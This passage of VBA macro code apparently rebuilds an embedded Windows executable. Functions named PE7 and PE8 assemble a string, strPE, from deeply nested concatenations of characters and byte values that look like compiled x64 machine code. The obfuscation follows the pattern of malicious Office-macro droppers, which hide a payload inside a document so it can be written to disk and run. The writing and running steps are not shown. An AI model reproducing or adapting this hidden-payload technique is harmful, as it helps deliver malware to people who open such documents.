    strPE = A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(strPE, "A"), 139), 1), "A"), 139), 8), "I"), 131), 193), 4), "I"), 131), 192), 4), "I"), 15), 175), 199), "L"), 1), 240), "I"), 137), 198), 137), 192), "H"), 1), 208), "I"), 193), 238), " H)"), 193), "H"), 137), 200), "A"), 137), "H"), 252), "H"), 193), 232), " "), 131), 224), 1)
    strPE = A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(strPE, "H"), 137), 194), "L9"), 207), "s"), 198), "E"), 139), 10), "E"), 133), 201), 15), 132), 157), 0), 0), 0), "L"), 137), 218), "L"), 137), 225), 232), "O!"), 0), 0), 133), 192), "xGA"), 141), "E"), 1), "I"), 137), 232), 137), "D$,1"), 192), "f"), 15)
    strPE = A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(strPE, 31), "D"), 0), 0), 139), 11), "A"), 139), 16), "H"), 131), 195), 4), "I"), 131), 192), 4), "H"), 1), 200), "H)"), 194), "H"), 137), 208), "A"), 137), "P"), 252), "H"), 193), 232), " "), 131), 224), 1), "H9"), 223), "s"), 218), "Hc"), 198), "H"), 141), "D"), 133), 0)
    strPE = A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(strPE, 139), 8), 133), 201), "t%"), 139), "D$,H"), 131), 196), "8[^_]A\A]A^A_"), 195), 15), 31), 128), 0), 0), 0), 0), 139), 16), 133), 210), "u"), 12), 131), 238), 1), "H"), 131), 232), 4), "H9"), 197)
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(strPE, "r"), 238), "A"), 137), "t$"), 20), 235), 203), 15), 31), 128), 0), 0), 0), 0), "E"), 139), 2), "E"), 133), 192), "u"), 12), 131), 238), 1), "I"), 131), 234), 4), "L9"), 213), "r"), 236), "A"), 137), "t$"), 20), "L"), 137), 218), "L"), 137), 225), 232), 164), " ")
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 133), 192), 15), 137), "Q"), 255), 255), 255), 235), 150), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "AWAVAUATUWVSH"), 129), 236), 184), 0), 0), 0), 15), 17), 180), "$"), 160), 0), 0), 0), 139)
    strPE = A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(strPE, 132), "$ "), 1), 0), 0), "A"), 139), ")D"), 139), 180), "$("), 1), 0), 0), 137), "D$ H"), 139), 132), "$0"), 1), 0), 0), "H"), 137), 207), "L"), 137), 206), 137), "T$@H"), 137), "D$(H"), 139), 132), "$8"), 1)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(strPE, 0), 0), "L"), 137), "D$8H"), 137), "D$0"), 137), 232), 131), 224), 207), "A"), 137), 1), 137), 232), 131), 224), 7), 131), 248), 3), 15), 132), 208), 2), 0), 0), 137), 235), 131), 227), 4), 137), "\$Hu5"), 133), 192), 15), 132), 141)
    strPE = A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(strPE, 2), 0), 0), 131), 232), 1), "1"), 219), 131), 248), 1), "vk"), 15), 16), 180), "$"), 160), 0), 0), 0), "H"), 137), 216), "H"), 129), 196), 184), 0), 0), 0), "[^_]A\A]A^A_"), 195), 15), 31), "@"), 0), "1"), 219)
    strPE = B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(strPE, 131), 248), 4), "u"), 214), "H"), 139), "D$(H"), 139), "T$0A"), 184), 3), 0), 0), 0), "H"), 141), 13), "kR"), 0), 0), 199), 0), 0), 128), 255), 255), 15), 16), 180), "$"), 160), 0), 0), 0), "H"), 129), 196), 184), 0), 0), 0), "[")
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(strPE, "^_]A\A]A^A_"), 233), 236), 252), 255), 255), 15), 31), "@"), 0), "D"), 139), "!"), 184), " "), 0), 0), 0), "1"), 201), "A"), 131), 252), " ~"), 10), 1), 192), 131), 193), 1), "A9"), 196), 127), 246), 232), ")"), 24), 0)
    strPE = B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(strPE, 0), "E"), 141), "D$"), 255), "A"), 193), 248), 5), "I"), 137), 199), "H"), 139), "D$8Mc"), 192), "I"), 141), "W"), 24), "I"), 193), 224), 2), "J"), 141), 12), 0), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "D"), 139), 8), "H"), 131), 192), 4), "H")
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(strPE, 131), 194), 4), "D"), 137), "J"), 252), "H9"), 193), "s"), 236), "H"), 139), "\$8H"), 131), 193), 1), "I"), 141), "@"), 4), "H"), 141), "S"), 1), "H9"), 209), 186), 4), 0), 0), 0), "H"), 15), "B"), 194), "H"), 193), 248), 2), 137), 195), "I"), 141), 4)
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 135), 235), 15), 15), 31), 0), "H"), 131), 232), 4), 133), 219), 15), 132), 220), 1), 0), 0), "D"), 139), "X"), 20), 137), 218), 131), 235), 1), "E"), 133), 219), "t"), 230), "Hc"), 219), "A"), 137), "W"), 20), 193), 226), 5), "A"), 15), 189), "D"), 159), 24), 137), 211)
    strPE = B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(strPE, 131), 240), 31), ")"), 195), "L"), 137), 249), 232), 7), 22), 0), 0), "D"), 139), "l$@"), 137), 132), "$"), 156), 0), 0), 0), 133), 192), 15), 133), 171), 1), 0), 0), "E"), 139), "W"), 20), "E"), 133), 210), 15), 132), "&"), 1), 0), 0), "H"), 141), 148), "$")
    strPE = A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 156), 0), 0), 0), "L"), 137), 249), 232), 198), " "), 0), 0), 242), 15), 16), 13), "^Q"), 0), 0), "E"), 141), "D"), 29), 0), "fH"), 15), "~"), 194), "fH"), 15), "~"), 192), "A"), 141), "H"), 255), "H"), 193), 234), " "), 137), 192), "A"), 137), 201), 129), 226)
    strPE = A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 255), 255), 15), 0), "A"), 193), 249), 31), 129), 202), 0), 0), 240), "?E"), 137), 203), "I"), 137), 210), "A1"), 203), "I"), 193), 226), " E)"), 203), "L"), 9), 208), "A"), 129), 235), "5"), 4), 0), 0), "fH"), 15), "n"), 192), 242), 15), "\"), 5), 251)
    strPE = A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(strPE, "P"), 0), 0), 242), 15), "Y"), 5), 251), "P"), 0), 0), 242), 15), "X"), 200), "f"), 15), 239), 192), 242), 15), "*"), 193), 242), 15), "Y"), 5), 247), "P"), 0), 0), 242), 15), "X"), 193), "E"), 133), 219), "~"), 21), "f"), 15), 239), 201), 242), "A"), 15), "*"), 203), 242)
    strPE = B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(strPE, 15), "Y"), 13), 229), "P"), 0), 0), 242), 15), "X"), 193), "f"), 15), 239), 246), 242), "D"), 15), ","), 208), "f"), 15), "/"), 240), 15), 135), 30), 7), 0), 0), "A"), 137), 203), 137), 192), "A"), 193), 227), 20), "D"), 1), 218), "H"), 193), 226), " H"), 9), 208), "H")
    strPE = A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 137), 132), "$"), 128), 0), 0), 0), "I"), 137), 195), 137), 216), ")"), 200), 141), "H"), 255), 137), "L$PA"), 131), 250), 22), 15), 135), 219), 0), 0), 0), "H"), 139), 13), "4S"), 0), 0), "Ic"), 210), "fI"), 15), "n"), 235), 242), 15), 16), 4)
    strPE = A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(strPE, 209), "f"), 15), "/"), 197), 15), 134), "m"), 3), 0), 0), 199), 132), "$"), 136), 0), 0), 0), 0), 0), 0), 0), "A"), 131), 234), 1), 233), 180), 0), 0), 0), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "L"), 137), 249), 232), "8"), 23), 0), 0), 15), 31)
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(strPE, 132), 0), 0), 0), 0), 0), "H"), 139), "D$(H"), 139), "T$0A"), 184), 1), 0), 0), 0), "H"), 141), 13), 22), "P"), 0), 0), 199), 0), 1), 0), 0), 0), 232), 174), 250), 255), 255), "H"), 137), 195), 233), "S"), 253), 255), 255), "f"), 15)
    strPE = A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(strPE, 31), "D"), 0), 0), "H"), 139), "D$(H"), 139), "T$0A"), 184), 8), 0), 0), 0), "H"), 141), 13), 217), "O"), 0), 0), 199), 0), 0), 128), 255), 255), 233), "r"), 253), 255), 255), "f"), 15), 31), "D"), 0), 0), "A"), 199), "G"), 20), 0), 0)
    strPE = A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 0), 0), 233), "<"), 254), 255), 255), 15), 31), 0), 137), 194), "L"), 137), 249), 232), ">"), 19), 0), 0), "D"), 139), "l$@+"), 156), "$"), 156), 0), 0), 0), "D"), 3), 172), "$"), 156), 0), 0), 0), 233), "2"), 254), 255), 255), 15), 31), "D"), 0), 0)
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(strPE, 199), 132), "$"), 136), 0), 0), 0), 1), 0), 0), 0), "D"), 139), "L$P"), 199), "D$`"), 0), 0), 0), 0), "E"), 133), 201), 15), 136), 207), 5), 0), 0), "E"), 133), 210), 15), 137), 165), 2), 0), 0), "D"), 137), 208), "D)T$`")
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(strPE, 247), 216), "D"), 137), "T$pE1"), 210), 137), "D$t"), 139), "D$ "), 131), 248), 9), 15), 135), 163), 2), 0), 0), 131), 248), 5), 15), 143), 226), 5), 0), 0), "A"), 129), 192), 253), 3), 0), 0), "1"), 192), "A"), 129), 248), 247), 7)
    strPE = A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 0), 0), 15), 150), 192), 137), "D$T"), 139), "D$ "), 131), 248), 4), 15), 132), ">"), 11), 0), 0), 131), 248), 5), 15), 132), 141), 9), 0), 0), 131), 248), 2), 15), 133), 180), 6), 0), 0), 199), "D$h"), 0), 0), 0), 0), "E"), 133)
    strPE = B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 246), 185), 1), 0), 0), 0), "A"), 15), "O"), 206), 137), 140), "$"), 156), 0), 0), 0), "A"), 137), 206), 137), 140), "$"), 140), 0), 0), 0), 137), "L$LD"), 137), "T$x"), 232), "A"), 249), 255), 255), 131), "|$L"), 14), "D"), 15), 182), "L")
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(strPE, "$TH"), 137), "D$X"), 15), 150), 192), "D"), 139), "T$xA!"), 193), 139), "G"), 12), 131), 232), 1), 137), "D$Tt("), 139), "T$T"), 184), 2), 0), 0), 0), 133), 210), 15), "I"), 194), 131), 229), 8), 137), "D$")
    strPE = A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "T"), 137), 193), 15), 132), 205), 5), 0), 0), 184), 3), 0), 0), 0), ")"), 200), 137), "D$TE"), 132), 201), 15), 132), 185), 5), 0), 0), 139), "D$T"), 11), "D$p"), 15), 133), 171), 5), 0), 0), "D"), 139), 132), "$"), 136), 0), 0)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 0), 199), 132), "$"), 156), 0), 0), 0), 0), 0), 0), 0), 242), 15), 16), 132), "$"), 128), 0), 0), 0), "E"), 133), 192), "t"), 18), 242), 15), 16), "%"), 130), "N"), 0), 0), "f"), 15), "/"), 224), 15), 135), 28), 14), 0), 0), "f"), 15), 16), 200), 242), 15)
    strPE = A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(strPE, "X"), 200), 242), 15), "X"), 13), 128), "N"), 0), 0), "fH"), 15), "~"), 202), "fH"), 15), "~"), 200), "H"), 193), 234), " "), 137), 192), 129), 234), 0), 0), "@"), 3), "H"), 193), 226), " H"), 9), 208), 139), "T$L"), 133), 210), 15), 132), 14), 5), 0)

    PE7 = strPE
End Function

Private Function PE8() As String
   Dim strPE As String

    strPE = ""
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(strPE, 0), "D"), 139), "\$L1"), 237), "H"), 139), 21), 193), "P"), 0), 0), "fH"), 15), "n"), 208), "A"), 141), "C"), 255), "H"), 152), 242), 15), 16), "$"), 194), 139), "D$h"), 133), 192), 15), 132), 198), 12), 0), 0), 242), 15), 16), 13), "MN"), 0)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(strPE, 0), 242), 15), ","), 208), "H"), 139), "L$X"), 242), 15), "^"), 204), "H"), 141), "A"), 1), 242), 15), "\"), 202), "f"), 15), 239), 210), 242), 15), "*"), 210), 131), 194), "0"), 136), 17), 242), 15), "\"), 194), "f"), 15), "/"), 200), 15), 135), 205), 15), 0), 0), 242)
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 15), 16), "%"), 213), "M"), 0), 0), 242), 15), 16), 29), 213), "M"), 0), 0), 235), "I"), 15), 31), 0), 139), 140), "$"), 156), 0), 0), 0), 141), "Q"), 1), 137), 148), "$"), 156), 0), 0), 0), "D9"), 218), 15), 141), 166), 4), 0), 0), 242), 15), "Y"), 195)
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(strPE, "f"), 15), 239), 210), "H"), 131), 192), 1), 242), 15), "Y"), 203), 242), 15), ","), 208), 242), 15), "*"), 210), 131), 194), "0"), 136), "P"), 255), 242), 15), "\"), 194), "f"), 15), "/"), 200), 15), 135), "r"), 15), 0), 0), "f"), 15), 16), 212), 242), 15), "\"), 208), "f"), 15)
    strPE = A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(strPE, "/"), 202), "v"), 172), 141), "}"), 1), 15), 182), "P"), 255), "H"), 139), "\$XH"), 137), 193), 137), "|$P"), 235), 23), 15), 31), 128), 0), 0), 0), 0), "H9"), 216), 15), 132), "V"), 14), 0), 0), 15), 182), "P"), 255), "H"), 137), 193), "H"), 141)
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(strPE, "A"), 255), 128), 250), "9t"), 231), "H"), 137), "L$X"), 131), 194), 1), 136), 16), 199), "D$H "), 0), 0), 0), 233), 15), 3), 0), 0), 15), 31), 132), 0), 0), 0), 0), 0), 139), "T$P"), 199), "D$`"), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 199), 132), "$"), 136), 0), 0), 0), 0), 0), 0), 0), 133), 210), 15), 136), "!"), 3), 0), 0), "D"), 1), "T$PD"), 137), "T$p"), 199), "D$t"), 0), 0), 0), 0), 233), "Z"), 253), 255), 255), "f."), 15), 31), 132), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 0), 0), 199), "D$ "), 0), 0), 0), 0), "f"), 15), 239), 192), "D"), 137), "T$L"), 242), "A"), 15), "*"), 196), 242), 15), "Y"), 5), 186), "L"), 0), 0), 242), 15), ","), 200), 131), 193), 3), 137), 140), "$"), 156), 0), 0), 0), 232), 223), 246), 255)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(strPE, 255), "D"), 139), "T$LH"), 137), "D$X"), 139), "G"), 12), 131), 232), 1), 137), "D$T"), 15), 133), 17), 3), 0), 0), "E"), 133), 237), 15), 136), "X"), 13), 0), 0), 139), "D$p9G"), 20), 15), 141), 137), 8), 0), 0), 199)
    strPE = B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(strPE, "D$L"), 255), 255), 255), 255), "E1"), 246), 199), 132), "$"), 140), 0), 0), 0), 255), 255), 255), 255), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "A)"), 220), "D"), 137), 233), 139), "W"), 4), "A"), 141), "D$"), 1), "D)"), 225), 137), 132), "$")
    strPE = B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 156), 0), 0), 0), "9"), 209), 15), 141), 144), 6), 0), 0), "D"), 139), "\$ A"), 141), "K"), 253), 131), 225), 253), 15), 132), "~"), 6), 0), 0), "A)"), 213), "A"), 131), 251), 1), "D"), 139), "\$L"), 15), 159), 193), "A"), 141), "E"), 1), "E")
    strPE = A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 133), 219), 137), 132), "$"), 156), 0), 0), 0), 15), 159), 194), 132), 209), "t"), 9), "D9"), 216), 15), 143), "\"), 6), 0), 0), 139), "T$`"), 1), "D$PD"), 139), "l$t"), 1), 208), 137), 213), 137), "D$`"), 185), 1), 0), 0)
    strPE = B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(strPE, 0), "D"), 137), "T$x"), 232), 205), 19), 0), 0), 199), "D$h"), 1), 0), 0), 0), "D"), 139), "T$xI"), 137), 196), 133), 237), "~"), 34), 139), "L$P"), 133), 201), "~"), 26), "9"), 205), 137), 200), 15), "N"), 197), ")D$`")
    strPE = A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(strPE, ")"), 193), 137), 132), "$"), 156), 0), 0), 0), ")"), 197), 137), "L$PD"), 139), "L$tE"), 133), 201), "t[D"), 139), "D$hE"), 133), 192), 15), 132), "s"), 8), 0), 0), "E"), 133), 237), "~;L"), 137), 225), "D"), 137), 234)
    strPE = A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "D"), 137), 148), "$"), 128), 0), 0), 0), 232), 135), 21), 0), 0), "L"), 137), 250), "H"), 137), 193), "I"), 137), 196), 232), 25), 20), 0), 0), "L"), 137), 249), "H"), 137), "D$x"), 232), ","), 18), 0), 0), "L"), 139), "|$xD"), 139), 148), "$"), 128)
    strPE = A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 139), "T$tD)"), 234), 15), 133), "S"), 8), 0), 0), 185), 1), 0), 0), 0), "D"), 137), "T$t"), 232), "#"), 19), 0), 0), 131), 251), 1), "D"), 139), "T$t"), 15), 148), 195), 131), "|$ "), 1), "I"), 137), 197)
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(strPE, 15), 158), 192), "!"), 195), "E"), 133), 210), 15), 143), 2), 3), 0), 0), 199), "D$t"), 0), 0), 0), 0), 132), 219), 15), 133), "C"), 11), 0), 0), 191), 31), 0), 0), 0), "E"), 133), 210), 15), 133), 7), 3), 0), 0), "+|$PD"), 139)
    strPE = B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(strPE, "D$`"), 131), 239), 4), 131), 231), 31), "A"), 1), 248), 137), 188), "$"), 156), 0), 0), 0), 137), 250), "E"), 133), 192), "~"), 21), "D"), 137), 194), "L"), 137), 249), 232), 217), 22), 0), 0), 139), 148), "$"), 156), 0), 0), 0), "I"), 137), 199), 3), "T$")
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "P"), 133), 210), "~"), 11), "L"), 137), 233), 232), 191), 22), 0), 0), "I"), 137), 197), 139), 140), "$"), 136), 0), 0), 0), 131), "|$ "), 2), 15), 159), 195), 133), 201), 15), 133), "5"), 5), 0), 0), 139), "D$L"), 133), 192), 15), 143), 185), 2), 0)
    strPE = A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 0), 132), 219), 15), 132), 177), 2), 0), 0), 139), "D$L"), 133), 192), 15), 133), "J"), 2), 0), 0), "L"), 137), 233), "E1"), 192), 186), 5), 0), 0), 0), 232), 165), 17), 0), 0), "L"), 137), 249), "H"), 137), 194), "I"), 137), 197), 232), "w"), 23), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(strPE, 0), 133), 192), 15), 142), "$"), 2), 0), 0), 139), "D$pH"), 139), "\$X"), 131), 192), 2), 137), "D$PH"), 131), "D$X"), 1), 198), 3), "1"), 199), "D$H "), 0), 0), 0), "L"), 137), 233), 232), 246), 16), 0), 0)
    strPE = A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "M"), 133), 228), "t"), 8), "L"), 137), 225), 232), 233), 16), 0), 0), "L"), 137), 249), 232), 225), 16), 0), 0), "H"), 139), "|$(H"), 139), "D$X"), 139), "L$P"), 198), 0), 0), 137), 15), "H"), 139), "|$0H"), 133), 255), "t"), 3)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "H"), 137), 7), 139), "D$H"), 9), 6), 233), 3), 247), 255), 255), "f"), 15), 31), "D"), 0), 0), 186), 1), 0), 0), 0), 199), "D$P"), 0), 0), 0), 0), ")"), 194), 137), "T$`"), 233), 25), 250), 255), 255), 15), 31), 132), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(strPE, 0), 0), "f"), 15), 239), 201), 242), "A"), 15), "*"), 202), "f"), 15), "."), 200), "z"), 10), "f"), 15), "/"), 200), 15), 132), 201), 248), 255), 255), "A"), 131), 234), 1), 233), 192), 248), 255), 255), "f"), 15), 31), "D"), 0), 0), 131), 232), 4), 199), "D$T"), 0)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(strPE, 0), 0), 0), 137), "D$ "), 233), "!"), 250), 255), 255), 199), "D$h"), 1), 0), 0), 0), "E1"), 246), "E1"), 201), 199), 132), "$"), 140), 0), 0), 0), 255), 255), 255), 255), 199), "D$L"), 255), 255), 255), 255), 233), "t"), 250), 255), 255)
    strPE = B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(strPE, "f"), 15), 16), 200), 242), 15), "X"), 200), 242), 15), "X"), 13), "fI"), 0), 0), "fH"), 15), "~"), 202), "fH"), 15), "~"), 200), "H"), 193), 234), " "), 137), 192), 129), 234), 0), 0), "@"), 3), "H"), 193), 226), " H"), 9), 208), 242), 15), "\"), 5), "I")
    strPE = A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(strPE, "I"), 0), 0), "fH"), 15), "n"), 200), "f"), 15), "/"), 193), 15), 135), 130), 9), 0), 0), "f"), 15), "W"), 13), "BI"), 0), 0), "f"), 15), "/"), 200), 15), 135), 215), 0), 0), 0), 199), "D$T"), 0), 0), 0), 0), "E"), 133), 237), 15), 136), 167)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 139), "D$p9G"), 20), 15), 140), 154), 0), 0), 0), "H"), 139), 21), "sK"), 0), 0), "H"), 152), "H"), 137), 199), 242), 15), 16), 20), 194), "E"), 133), 246), 15), 137), 243), 4), 0), 0), 139), "D$L"), 133), 192), 15), 143)
    strPE = A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 231), 4), 0), 0), 15), 133), 141), 0), 0), 0), 242), 15), "Y"), 21), 214), "H"), 0), 0), "f"), 15), "/"), 148), "$"), 128), 0), 0), 0), "sz"), 131), 199), 2), "H"), 139), "\$XE1"), 237), "E1"), 228), 137), "|$P"), 233), "U"), 254)
